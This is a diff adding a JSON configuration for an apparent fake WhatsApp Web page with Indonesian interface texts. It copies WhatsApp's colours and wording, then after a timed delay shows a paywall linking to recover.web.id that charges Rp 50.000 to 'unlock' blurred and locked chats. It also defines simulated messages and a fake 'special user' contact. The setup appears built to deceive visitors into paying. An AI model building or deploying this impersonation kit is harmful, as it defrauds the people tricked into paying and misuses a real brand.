@@ -1,0 +1,165 @@
+{
+  "app": {
+    "name": "WhatsApp Web",
+    "paywallUrl": "https://recover.web.id",
+    "price": "Rp 50.000"
+  },
+  "timing": {
+    "paywallDelay": 20000,
+    "simulationInitialDelay": 5000,
+    "simulationMinInterval": 30000,
+    "simulationMaxInterval": 120000,
+    "statusViewDuration": 3500
+  },
+  "colors": {
+    "primary": "#00a884",
+    "primaryHover": "#008f6f",
+    "background": "#d1d7db",
+    "chatBackground": "#efeae2",
+    "sidebarBackground": "#f0f2f5",
+    "headerGreen": "#008069",
+    "textPrimary": "#111b21",
+    "textSecondary": "#667781",
+    "textMuted": "#54656f",
+    "border": "#e1dcd5"
+  },
+  "texts": {
+    "lock": {
+      "title": "WhatsApp Terkunci",
+      "subtitle": "Klik tombol di bawah untuk membuka",
+      "button": "Buka Kunci"
+    },
+    "welcome": {
+      "title": "WhatsApp Web",
+      "description": "Kirim dan terima pesan tanpa perlu menghubungkan telepon Anda secara online.",
+      "footer": "Gunakan WhatsApp di hingga 4 perangkat tertaut dan 1 telepon sekaligus."
+    },
+    "paywall": {
+      "title": "Akses Terbatas",
+      "description": "Fitur Mode Privasi dan Kunci Chat sedang aktif. Lakukan pembayaran untuk menghilangkan batasan dan blur pada chat.",
+      "button": "Bayar",
+      "later": "Nanti Saja"
+    },
+    "privacy": {
+      "enableBlur": "Aktifkan Blur Privasi",
+      "disableBlur": "Matikan Blur Privasi",
+      "lockChat": "Kunci Chat (Tidak bisa diklik)",
+      "unlockChat": "Buka Kunci Chat"
+    },
+    "sidebar": {
+      "archived": "Diarsipkan",
+      "newChat": "Chat Baru",
+      "newGroup": "Grup baru",
+      "starredMessages": "Pesan berbintang",
+      "settings": "Setelan",
+      "lockScreen": "Kunci Layar",
+      "logout": "Keluar",
+      "searchPlaceholder": "Cari atau mulai chat baru",
+      "searchUnread": "Cari chat belum dibaca",
+      "searchDisabled": "Pencarian dinonaktifkan",
+      "filterUnread": "Filter chat belum dibaca",
+      "noChatsFound": "Chat tidak ditemukan",
+      "noArchivedChats": "Tidak ada chat yang diarsipkan",
+      "encrypted": "Pesan Anda dilindungi enkripsi end-to-end",
+      "archivedCount": "archivedCount"
+    },
+    "chatMenu": {
+      "contactInfo": "Info kontak",
+      "selectMessage": "Pilih pesan",
+      "closeChat": "Tutup chat",
+      "muteNotifications": "Bisukan notifikasi",
+      "temporaryMessage": "Pesan sementara",
+      "clearMessages": "Bersihkan pesan",
+      "deleteChat": "Hapus chat"
+    },
+    "chatWindow": {
+      "online": "online",
+      "lastSeen": "terakhir dilihat hari ini 12:00",
+      "search": "Cari",
+      "menu": "Menu",
+      "searchMessages": "Cari pesan",
+      "searchInChat": "Cari...",
+      "searchWith": "Cari pesan dengan",
+      "emoji": "Emoji",
+      "attach": "Lampirkan",
+      "typeMessage": "Ketik pesan",
+      "voiceRecord": "Rekam Suara",
+      "attachments": {
+        "document": "Dokumen",
+        "photoVideo": "Foto & video",
+        "camera": "Kamera",
+        "contact": "Kontak",
+        "poll": "Polling",
+        "newSticker": "Stiker baru"
+      },
+      "contextMenu": {
+        "unarchive": "Buka arsip",
+        "archive": "Arsipkan chat",
+        "markUnread": "Tandai belum dibaca",
+        "delete": "Hapus chat"
+      }
+    },
+    "status": {
+      "title": "Status",
+      "myStatus": "Status Saya",
+      "addStatus": "Klik untuk menambahkan pembaruan status",
+      "recent": "TERBARU",
+      "viewed": "DILIHAT",
+      "noStatus": "Tidak ada pembaruan status dari kontak Anda.",
+      "search": "Cari status"
+    },
+    "newChat": {
+      "title": "Chat baru",
+      "contacts": "kontak",
+      "searchPlaceholder": "Cari nama atau nomor",
+      "newGroup": "Grup baru",
+      "newCommunity": "Komunitas baru",
+      "contactsOnWhatsApp": "Kontak di WhatsApp",
+      "noContactsFound": "Tidak ada kontak ditemukan untuk"
+    },
+    "profile": {
+      "title": "Profil",
+      "yourName": "Nama Anda",
+      "namePlaceholder": "Nama Saya",
+      "about": "Info",
+      "aboutPlaceholder": "Ada",
+      "aboutHint": "Ini bukan username atau PIN Anda. Nama ini akan terlihat oleh kontak WhatsApp Anda.",
+      "changePhoto": "Ganti Foto Profil"
+    },
+    "settings": {
+      "title": "Setelan",
+      "notifications": "Notifikasi",
+      "notificationsSub": "Nada pesan, grup & panggilan",
+      "privacy": "Privasi",
+      "privacySub": "Blokir kontak, pesan sementara",
+      "theme": "Tema",
+      "themeSub": "Default sistem",
+      "wallpaper": "Wallpaper Chat",
+      "wallpaperSub": "Doodle",
+      "requestAccount": "Minta Info Akun",
+      "help": "Bantuan",
+      "helpSub": "Pusat bantuan, hubungi kami, kebijakan privasi"
+    }
+  },
+  "urls": {
+    "avatars": {
+      "default": "https://picsum.photos/id/64/200/200",
+      "special": "https://picsum.photos/id/65/200/200"
+    },
+    "background": {
+      "chat": "https://user-images.githubusercontent.com/15075759/28719144-86dc0f70fcded21.png"
+    }
+  },
+  "mockData": {
+    "totalContacts": 900,
+    "totalGroups": 20,
+    "totalArchived": 90,
+    "totalActiveChats": 40,
+    "specialUser": {
+      "id": "special_1",
+      "name": "Dinda ❤️",
+      "about": "Lucky to have you 🔒❤️",
+      "phone": "+62 812-3456-7890"
+    }
+  }
+}
